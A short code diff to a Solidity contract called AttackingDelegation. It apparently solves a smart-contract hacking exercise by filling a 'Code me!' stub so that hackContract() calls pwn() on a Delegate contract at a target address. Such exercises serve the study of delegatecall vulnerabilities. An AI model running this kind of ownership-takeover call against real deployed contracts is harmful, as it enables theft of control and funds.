@@ -2,6 +2,7 @@
 pragma solidity ^0.8.9;
 import "./Delegation.sol";
 
+
 contract AttackingDelegation {
     address public contractAddress;
 
@@ -10,6 +11,10 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+
+        Delegate delegate = Delegate(contractAddress);
+
+        delegate.pwn();
+        
     }
 }
